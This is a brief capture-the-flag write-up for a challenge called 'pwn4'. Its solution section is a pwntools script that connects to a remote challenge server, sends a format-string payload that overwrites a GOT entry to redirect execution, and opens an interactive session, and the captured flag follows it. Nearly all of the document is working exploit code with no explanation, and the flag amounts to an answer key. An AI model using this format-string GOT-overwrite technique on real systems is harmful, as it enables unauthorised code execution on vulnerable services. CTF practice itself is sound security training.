# **pwn4**

#### tag : pwn

-----------------------------------------------

#### Description

>GOT is a amazing series!
>
>nc 104.154.106.182 5678
>
>author: codacker

-----------------------------------------------

#### Solution

```python
from pwn import *

context.log_level = 'debug'
r = remote('104.154.106.182', 5678)

p = fmtstr_payload(7, {0x80498fc: 0x0804853d}, numbwritten=0, write_size='byte')

r.recvuntil('\n')
r.sendline(p)
r.recvuntil('\n')
r.interactive()
```
**encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}**
